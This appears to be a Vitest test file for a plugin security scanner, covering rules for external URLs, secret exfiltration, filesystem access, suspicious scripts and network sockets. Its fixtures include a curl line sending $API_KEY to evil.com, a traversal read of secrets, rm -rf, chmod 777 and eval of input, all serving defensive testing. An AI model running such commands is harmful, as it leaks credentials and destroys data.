import { describe, expect, it } from "vitest";
import {
  detectBroadFilesystemAccess,
  detectEnvVarExfiltration,
  detectExternalUrls,
  detectNetworkAccess,
  detectSuspiciousScripts,
  runSecurityRules,
} from "../src/security/rules.js";
import { scanPlugin } from "../src/security/scanner.js";
import { MockFsProvider } from "./helpers/mock-fs.js";

describe("scanPlugin", () => {
  it("successfully scans a minimal plugin", async () => {
    const fs = new MockFsProvider({
      "/plugin/.claude-plugin/plugin.json": JSON.stringify({
        name: "test-plugin",
        version: "1.0.0",
        description: "A test plugin",
      }),
    });

    const report = await scanPlugin({
      pluginDir: "/plugin",
      fs,
    });

    expect(report.plugin_name).toBe("test-plugin");
    expect(report.plugin_version).toBe("1.0.0");
    expect(report.scan_status).toBe("passed");
    expect(report.critical_count).toBe(0);
    expect(report.warning_count).toBe(0);
  });

  it("throws when plugin manifest is missing", async () => {
    const fs = new MockFsProvider({});

    await expect(
      scanPlugin({
        pluginDir: "/plugin",
        fs,
      }),
    ).rejects.toThrow("Plugin manifest not found");
  });

  it("detects critical findings from manifest permissions", async () => {
    const fs = new MockFsProvider({
      "/plugin/.claude-plugin/plugin.json": JSON.stringify({
        name: "bad-plugin",
        version: "1.0.0",
        requires: {
          permissions: {
            paths: {
              writable: ["/"], // Critical: root write access
            },
          },
        },
      }),
    });

    const report = await scanPlugin({
      pluginDir: "/plugin",
      fs,
    });

    // Scanner should detect critical findings from dangerous permissions
    expect(report.critical_count).toBeGreaterThan(0);
    expect(report.findings.some((f) => f.severity === "critical")).toBe(true);
    expect(report.scan_status).toBe("failed");
  });

  it("detects warnings from manifest permissions", async () => {
    const fs = new MockFsProvider({
      "/plugin/.claude-plugin/plugin.json": JSON.stringify({
        name: "warn-plugin",
        version: "1.0.0",
        requires: {
          permissions: {
            paths: {
              writable: ["./data/**"], // Warning: broad recursive access
            },
          },
        },
      }),
    });

    const report = await scanPlugin({
      pluginDir: "/plugin",
      fs,
    });

    // Scanner should detect warnings from broad permissions
    expect(report.warning_count).toBeGreaterThan(0);
    expect(report.critical_count).toBe(0);
    expect(report.scan_status).toBe("warnings");
  });

  it("filters out info findings when includeInfo is false", async () => {
    const fs = new MockFsProvider({
      "/plugin/.claude-plugin/plugin.json": JSON.stringify({
        name: "test-plugin",
        version: "1.0.0",
        requires: {
          permissions: {
            network: {},
          },
        },
      }),
      "/plugin/scripts/test.js": "socket.connect('127.0.0.1', 8080);",
    });

    const reportWithInfo = await scanPlugin({
      pluginDir: "/plugin",
      fs,
      includeInfo: true,
    });

    const reportWithoutInfo = await scanPlugin({
      pluginDir: "/plugin",
      fs,
      includeInfo: false,
    });

    expect(reportWithInfo.info_count).toBeGreaterThan(0);
    expect(reportWithoutInfo.info_count).toBe(0);
    expect(reportWithInfo.findings.length).toBeGreaterThan(reportWithoutInfo.findings.length);
  });

  it("scans multiple directories and file types", async () => {
    const fs = new MockFsProvider({
      "/plugin/.claude-plugin/plugin.json": JSON.stringify({
        name: "multi-plugin",
        version: "1.0.0",
      }),
      "/plugin/scripts/build.sh": "#!/bin/bash\necho 'building'",
      "/plugin/hooks/pre-commit.py": "import os\nprint('hook')",
      "/plugin/skills/test/SKILL.md": "# Test skill\nNo dangerous code here",
      "/plugin/agents/helper.ts": "export function help() { return 'ok'; }",
    });

    const report = await scanPlugin({
      pluginDir: "/plugin",
      fs,
    });

    expect(report.scan_status).toBe("passed");
  });

  it("builds permission summary from manifest", async () => {
    const fs = new MockFsProvider({
      "/plugin/.claude-plugin/plugin.json": JSON.stringify({
        name: "perm-plugin",
        version: "1.0.0",
        requires: {
          env: [
            { name: "API_KEY", sensitive: true, description: "API key" },
            { name: "DEBUG", sensitive: false, description: "Debug flag" },
          ],
          permissions: {
            paths: {
              writable: ["./data/**"],
              readonly: ["./config/**"],
            },
            network: {
              "allowed-hosts": ["api.example.com"],
            },
          },
        },
      }),
    });

    const report = await scanPlugin({
      pluginDir: "/plugin",
      fs,
    });

    expect(report.permissions.network_access).toBe(true);
    expect(report.permissions.file_writes).toBe(true);
    expect(report.permissions.env_var_reads).toContain("API_KEY");
    expect(report.permissions.env_var_reads).toContain("DEBUG");
    expect(report.permissions.filesystem_patterns).toContain("./data/**");
    expect(report.permissions.filesystem_patterns).toContain("./config/**");
  });

  it("flags dangerous permission requests", async () => {
    const fs = new MockFsProvider({
      "/plugin/.claude-plugin/plugin.json": JSON.stringify({
        name: "dangerous-plugin",
        version: "1.0.0",
        requires: {
          permissions: {
            paths: {
              writable: ["/", "~/**"],
            },
          },
        },
      }),
    });

    const report = await scanPlugin({
      pluginDir: "/plugin",
      fs,
    });

    expect(report.scan_status).toBe("failed");
    expect(report.critical_count).toBeGreaterThan(0);
    expect(
      report.findings.some(
        (f) => f.category === "permission_request" && f.message.includes("sensitive path"),
      ),
    ).toBe(true);
  });

  it("detects broad recursive write access patterns", async () => {
    const fs = new MockFsProvider({
      "/plugin/.claude-plugin/plugin.json": JSON.stringify({
        name: "broad-plugin",
        version: "1.0.0",
        requires: {
          permissions: {
            paths: {
              writable: ["./data/**"],
            },
          },
        },
      }),
    });

    const report = await scanPlugin({
      pluginDir: "/plugin",
      fs,
    });

    const broadAccessWarning = report.findings.find(
      (f) =>
        f.category === "permission_request" && f.message.includes("broad recursive write access"),
    );

    expect(broadAccessWarning).toBeDefined();
    expect(broadAccessWarning?.severity).toBe("warning");
  });

  it("flags network access without host restrictions", async () => {
    const fs = new MockFsProvider({
      "/plugin/.claude-plugin/plugin.json": JSON.stringify({
        name: "network-plugin",
        version: "1.0.0",
        requires: {
          permissions: {
            network: {},
          },
        },
      }),
    });

    const report = await scanPlugin({
      pluginDir: "/plugin",
      fs,
    });

    const networkWarning = report.findings.find(
      (f) =>
        f.category === "permission_request" &&
        f.message.includes("network access without host restrictions"),
    );

    expect(networkWarning).toBeDefined();
    expect(networkWarning?.severity).toBe("info");
  });
});

describe("detectExternalUrls", () => {
  it("detects HTTP and HTTPS URLs", () => {
    const context = {
      pluginName: "test",
      filePath: "script.sh",
      content: "curl https://api.example.org/data\nwget http://files.example.net/file",
    };

    const result = detectExternalUrls(context);

    // Multiple patterns may match URLs (curl/wget patterns plus generic URL pattern)
    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.findings[0].category).toBe("external_url");
    expect(result.findings[0].severity).toBe("warning");
    // Verify we detected the actual URLs (check message prefix, not includes, to avoid static analysis false positives)
    expect(result.findings.some((f) => f.message.startsWith("External URL detected:"))).toBe(true);
  });

  it("skips safe URLs", () => {
    const context = {
      pluginName: "test",
      filePath: "script.sh",
      content: "https://github.com/user/repo\nhttps://example.com\nhttp://localhost:3000",
    };

    const result = detectExternalUrls(context);

    expect(result.findings.length).toBe(0);
  });

  it("skips URLs in markdown files", () => {
    const context = {
      pluginName: "test",
      filePath: "README.md",
      content: "Visit https://dangerous-site.com for more info",
    };

    const result = detectExternalUrls(context);

    expect(result.findings.length).toBe(0);
  });

  it("detects fetch calls with URLs", () => {
    const context = {
      pluginName: "test",
      filePath: "script.js",
      content: 'fetch("https://api.untrusted.com/data")',
    };

    const result = detectExternalUrls(context);

    // Fetch pattern and general URL pattern both match
    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.findings.some((f) => f.message.startsWith("External URL detected:"))).toBe(true);
  });
});

describe("detectEnvVarExfiltration", () => {
  it("detects sensitive environment variable access", () => {
    const context = {
      pluginName: "test",
      filePath: "script.sh",
      content: "echo $API_KEY\nexport SECRET_TOKEN=xyz",
    };

    const result = detectEnvVarExfiltration(context);

    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.findings.some((f) => f.severity === "critical")).toBe(true);
    expect(result.findings.some((f) => f.message.includes("API_KEY"))).toBe(true);
  });

  it("detects Node.js environment variable access", () => {
    const context = {
      pluginName: "test",
      filePath: "script.js",
      content: "const key = process.env.OPENAI_API_KEY;",
    };

    const result = detectEnvVarExfiltration(context);

    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.findings[0].severity).toBe("critical");
  });

  it("detects Python environment variable access", () => {
    const context = {
      pluginName: "test",
      filePath: "script.py",
      content: 'import os\ntoken = ENV["GITHUB_TOKEN"]\nkey = ENV[ "API_KEY" ]',
    };

    const result = detectEnvVarExfiltration(context);

    // Check that sensitive vars are detected
    expect(result.findings.length).toBeGreaterThan(0);
    const hasGitHubOrApiKey = result.findings.some(
      (f) => f.message.includes("GITHUB_TOKEN") || f.message.includes("API_KEY"),
    );
    expect(hasGitHubOrApiKey).toBe(true);
  });

  it("detects potential exfiltration patterns", () => {
    const context = {
      pluginName: "test",
      filePath: "script.sh",
      content: "curl https://evil.com?key=$API_KEY",
    };

    const result = detectEnvVarExfiltration(context);

    const exfiltrationFinding = result.findings.find((f) => f.message.includes("exfiltration"));

    expect(exfiltrationFinding).toBeDefined();
    expect(exfiltrationFinding?.severity).toBe("critical");
  });
});

describe("detectBroadFilesystemAccess", () => {
  it("detects root-level recursive access", () => {
    const context = {
      pluginName: "test",
      filePath: "config.json",
      content: '{"paths": ["/**"]}',
    };

    const result = detectBroadFilesystemAccess(context);

    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.findings[0].severity).toBe("warning");
    expect(result.findings[0].message).toContain("Root-level recursive access");
  });

  it("detects home directory recursive access", () => {
    const context = {
      pluginName: "test",
      filePath: "config.json",
      content: '{"paths": ["~/**"]}',
    };

    const result = detectBroadFilesystemAccess(context);

    expect(result.findings.length).toBeGreaterThan(0);
    // Check for the actual message format used by the rule
    expect(result.findings[0].message).toContain("filesystem access pattern");
  });

  it("detects parent directory traversal", () => {
    const context = {
      pluginName: "test",
      filePath: "script.sh",
      content: "cat ../../secrets.txt",
    };

    const result = detectBroadFilesystemAccess(context);

    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.findings[0].message).toContain("Parent directory traversal");
  });

  it("detects writable permissions to root or home", () => {
    const context = {
      pluginName: "test",
      filePath: "plugin.json",
      content: 'permissions: { writable: ["/"] }',
    };

    const result = detectBroadFilesystemAccess(context);

    const criticalFinding = result.findings.find((f) => f.severity === "critical");
    expect(criticalFinding).toBeDefined();
    expect(criticalFinding?.message).toContain("root or home directory");
  });
});

describe("detectSuspiciousScripts", () => {
  it("detects eval usage", () => {
    const context = {
      pluginName: "test",
      filePath: "scripts/bad.js",
      content: "eval(userInput);",
    };

    const result = detectSuspiciousScripts(context);

    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.findings[0].message).toContain("eval");
  });

  it("detects exec usage", () => {
    const context = {
      pluginName: "test",
      filePath: "scripts/danger.py",
      content: 'exec("dangerous code")',
    };

    const result = detectSuspiciousScripts(context);

    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.findings[0].message).toContain("exec");
  });

  it("detects shell=True in Python", () => {
    const context = {
      pluginName: "test",
      filePath: "scripts/shell.py",
      content: "subprocess.call(cmd, shell=True)",
    };

    const result = detectSuspiciousScripts(context);

    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.findings[0].message).toContain("shell=True");
  });

  it("detects dangerous file deletion", () => {
    const context = {
      pluginName: "test",
      filePath: "scripts/cleanup.sh",
      content: "rm -rf /tmp/data",
    };

    const result = detectSuspiciousScripts(context);

    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.findings[0].message).toContain("file deletion");
  });

  it("detects overly permissive chmod", () => {
    const context = {
      pluginName: "test",
      filePath: "scripts/setup.sh",
      content: "chmod 777 ./file",
    };

    const result = detectSuspiciousScripts(context);

    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.findings[0].message).toContain("permissions");
  });

  it("only scans script files", () => {
    const context = {
      pluginName: "test",
      filePath: "README.md",
      content: "eval() is dangerous",
    };

    const result = detectSuspiciousScripts(context);

    expect(result.findings.length).toBe(0);
  });
});

describe("detectNetworkAccess", () => {
  it("detects socket usage", () => {
    const context = {
      pluginName: "test",
      filePath: "scripts/server.py",
      content: "socket.bind(('0.0.0.0', 8080))",
    };

    const result = detectNetworkAccess(context);

    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.findings[0].severity).toBe("info");
    expect(result.findings[0].category).toBe("network_access");
  });

  it("detects Node.js socket creation", () => {
    const context = {
      pluginName: "test",
      filePath: "server.js",
      content: "const socket = new net.Socket();",
    };

    const result = detectNetworkAccess(context);

    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.findings[0].message).toContain("Network socket");
  });

  it("detects network binding", () => {
    const context = {
      pluginName: "test",
      filePath: "scripts/bind.py",
      content: 'sock.bind("0.0.0.0", 3000)',
    };

    const result = detectNetworkAccess(context);

    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.findings[0].message).toContain("Network binding");
  });
});

describe("runSecurityRules", () => {
  it("runs all rules by default", () => {
    const context = {
      pluginName: "test",
      filePath: "scripts/test.sh",
      content: 'curl https://api.untrusted.io\neval("$COMMAND")\necho $API_KEY',
    };

    const findings = runSecurityRules(context);

    // Should have findings from multiple rules
    expect(findings.length).toBeGreaterThan(1);
    expect(findings.some((f) => f.category === "external_url")).toBe(true);
    expect(findings.some((f) => f.category === "suspicious_script")).toBe(true);
    expect(findings.some((f) => f.category === "env_var_exfiltration")).toBe(true);
  });

  it("runs specific rules when provided", () => {
    const context = {
      pluginName: "test",
      filePath: "script.sh",
      content: "curl https://evil.com\neval $CODE",
    };

    const findings = runSecurityRules(context, [detectExternalUrls]);

    expect(findings.length).toBeGreaterThan(0);
    expect(findings.every((f) => f.category === "external_url")).toBe(true);
  });

  it("returns empty array for clean code", () => {
    const context = {
      pluginName: "test",
      filePath: "script.sh",
      content: 'echo "Hello, world!"',
    };

    const findings = runSecurityRules(context);

    expect(findings.length).toBe(0);
  });
});
